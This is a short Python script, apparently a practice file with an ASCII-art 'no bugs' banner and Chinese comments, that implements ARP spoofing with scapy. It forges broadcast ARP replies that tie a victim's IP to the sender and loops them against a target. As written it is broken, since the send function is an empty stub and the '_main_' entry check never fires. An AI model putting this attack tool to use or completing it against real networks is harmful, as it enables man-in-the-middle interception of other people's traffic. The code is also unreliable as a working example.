"""
title = ''
author = 'huifenghechang'
mtime = '2024/2/25'
code is far away from bugs with the god animal protecting
I love animals. They taste delicious.
┏┓      ┏┓
┏┛┻━━━┛┻┓
┃      ☃      ┃
┃  ┳┛  ┗┳  ┃
┃      ┻      ┃
┗━┓      ┏━┛
┃      ┗━━━┓
┃  神兽保佑    ┣┓
┃　永无BUG！   ┏┛
┗┓┓┏━┳┓┏┛
┃┫┫  ┃┫┫
┗┻┛  ┗┻┛
"""
from scapy.layers.l2 import ARP, Ether

"""
编写ARP欺骗脚本
"""

# ARP欺骗脚本
import sys
import time
from scapy.all import *


def senddp(pkt):
    pass


def arp_spoof(ip1, ip2):
    try:
        pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip1, psrc=ip2)
        senddp(pkt)
        return
    except:
        return


def main():
    if len(sys.argv) != 3:
        print("使用方法:./arpspoof.py 目标主机IP 被欺骗主机IP")
        sys.exit()
    ip1 = str(sys.argv[1]).strip()
    ip2 = str(sys.argv[2]).strip()
    while True:
        arp_spoof(ip1, ip2)
        time.sleep(0.5)


if __name__ == '_main_':
    main()
